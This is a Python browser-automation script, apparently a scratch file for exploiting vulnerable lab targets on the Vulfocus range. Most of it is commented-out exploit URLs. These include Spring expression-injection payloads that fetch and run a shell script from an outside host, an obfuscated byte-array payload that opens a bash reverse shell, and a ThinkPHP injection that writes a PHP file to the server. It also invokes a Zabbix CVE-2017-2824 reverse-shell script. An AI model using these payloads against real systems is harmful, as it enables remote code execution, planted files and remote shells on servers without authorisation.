import os
from DrissionPage import ChromiumPage
import requests
page = ChromiumPage()

# url="http://123.58.224.8:8020/?name=T(java.lang.String).forName(%27java.lang.Runtime%27).getRuntime().exec(%27apt-get%20install%20-y%20curl%27)"
# url="http://123.58.224.8:30789/?name=T(java.lang.String).forName(%27java.lang.Runtime%27).getRuntime().exec(%27curl%20-o%20/tmp/1.sh%20http://114.55.59.125:8000/xwl.sh%27)"

# url="http://123.58.224.8:40627/login"

# url="http://123.58.224.8:10166/?name=T(java.lang.String).forName('java.lang.Runtime').getRuntime().exec('apt-get update')"
# url="http://123.58.224.8:10166/?name=T(java.lang.String).forName('java.lang.Runtime').getRuntime().exec('apt-get install -y curl')"
# url="http://123.58.224.8:10166/?name=T(java.lang.String).forName('java.lang.Runtime').getRuntime().exec('curl -o /tmp/1.sh http://114.55.59.125:8000/xwl.sh')"
# url="http://123.58.224.8:10166/?name=T(java.lang.String).forName('java.lang.Runtime').getRuntime().exec('bash /tmp/1.sh')"

# url="http://123.58.224.8:40915/core/install.php?rewrite=ok&langcode=en&profile=standard&id=1&op=start"
# url="http://123.58.224.8:40915"
# url="http://123.58.224.8:40915/core/install.php?rewrite=ok&langcode=en&profile=standard&id=1&op=start"
# url="http://123.58.224.8:11001/article?id=${T(java.lang.Runtime).getRuntime().exec(new%20String(new%20byte[]{0x62,0x61,0x73,0x68,0x20,0x2d,0x63,0x20,0x7b,0x65,0x63,0x68,0x6f,0x2c,0x59,0x6d,0x46,0x7a,0x61,0x43,0x41,0x74,0x61,0x53,0x41,0x2b,0x4a,0x69,0x41,0x76,0x5a,0x47,0x56,0x32,0x4c,0x33,0x52,0x6a,0x63,0x43,0x38,0x78,0x4d,0x54,0x51,0x75,0x4e,0x54,0x55,0x75,0x4e,0x54,0x6b,0x75,0x4d,0x54,0x49,0x31,0x4c,0x7a,0x4d,0x7a,0x4d,0x7a,0x4d,0x67,0x4d,0x44,0x34,0x6d,0x4d,0x51,0x3d,0x3d,0x7d,0x7c,0x7b,0x62,0x61,0x73,0x65,0x36,0x34,0x2c,0x2d,0x64,0x7d,0x7c,0x7b,0x62,0x61,0x73,0x68,0x2c,0x2d,0x69,0x7d}))}"
# url="http://123.58.224.8:29913/install.php"
# url="http://123.58.224.8:10969/hostgroups.php?sid=bc5331cf4d3157f0"
# url="http://123.58.224.8:44214/wp-login.php"
# url="http://123.58.224.8:44214/groups/create/step/group-settings/"
# url="http://123.58.224.8:63866/pma/index.php"
# url="http://123.58.224.8:44631/admin/xml/queues.jsp"
# url="http://123.58.224.8:18399/wp-content/plugins/crelly-slider/wordpress/temp/phpinfo.php"
# url="http://123.58.224.8:29165?a=fetch&templateFile=public/index&prefix=''&content=file_put_contents('test.php','<?php phpinfo()?>')"
# url="http://123.58.224.8:29165/test.php"
# url="http://123.58.224.8:21058/portal/admin_category/addpost.html"
url = "http://123.58.224.8:32601/"

# print(page.tabs_count)
# print(page.tabs)
# print(page.main_tab)
page.get(url, retry=1000, interval=0.1)


# os.chdir(r'D:\BaiduNetdiskDownload\Tools\漏洞利用')
# commands=f'python Hadoop.py'
# res=os.system(commands)


# for i in range(100):
#     page.get(url, retry=1000, interval=0.1)
#     os.chdir(r'D:\BaiduNetdiskDownload\Tools\漏洞利用\VulFocus\Zabbix')
#     commands=f'python cve-2017-2824-reverse-shell.py 123.58.224.8'
#     res=os.system(commands)

# res=requests.put("http://123.58.224.8:49550/wp-json/buddypress/v1/signup/activate/hJyPOybF29Qfqw0KTnNNn9sxLtobS747")

# print(res.status_code)
# print(res.text)
# tab = page.get_tab()  # 获取当前标签页对象
# tab.get('https://www.baidu.com')  # 使用标签页对象

# url="http://123.58.224.8:25603"
# page.new_tab(url, retry=1000, interval=0.1)
